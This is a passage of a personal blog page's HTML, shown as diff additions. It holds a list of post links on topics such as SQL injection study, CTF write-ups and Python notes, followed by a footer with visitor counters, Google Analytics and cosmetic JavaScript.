href="/Study/spider-notes.html">Python3 Web Spider Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/ctf-syb.html">CTF in ShiYanBa</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sqli-labs.html">SQL Injection - Sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sql-injection-notes.html">SQL Injection 学习小记</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/python-notes.html">Python Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/linux-learning.html">Linux初探</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2018-books.html">My Book List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2018-films.html">My Film List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/seeyou2017.html">See you 2017 , Hello 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2017-films.html">2017-films</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/penetrating-courses.html">渗透课程</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/code-audit-BEES-4-0.html">代码审计实例-BEES_4.0_R_20160525</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/authentic-words.html">Authentic Words Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/php-dangerfuncts.html">PHP常见危险函数及特殊函数Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/mentohust-mac.html">Mac下配置mentohust连接校园网/移动/联通/</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/perceptions-jobs.html">Some perceptions after secondly read Steve Jobs‘s speech in Stanford</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/freshman-flags.html">It's time to set Flags in Freshman Year (完结)</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/classes-ctf.html">2017班级对抗赛WP&心得</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/importance-of-backup.html">论Mac备份的重要性<-血的教训</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 KarmA
+            </div>
+            <div id="footer_right_div" class="footer-right" style="text-align:center;overflow:hidden;">
+                <div id="web_count_div" class="post-count-bottom" style="display:inline;">
+                    Follow Your Heart.
+                    <i class="fa fa-heart animated infinite pulse" style="color:red;margin-left:2px;"></i><!-- 红心-->
+                </div>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                    <span>| </span>
+                    <span title="All Words">
+                         <span><i class="fa fa-map" aria-hidden="true"></i></span>
+                        <span class="post-count"><b>83.9k</b></span>
+                    </span>
+                
+            </div>
+        
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-120617453-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+             post: ".article-entry a[href], .copyright a[href]", 
+             tags: ".article-tag a", 
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+
+<script type="text/javascript" src="/resources/emoji.js"></script>
+
+
+  </div>
+</body>
+</html>
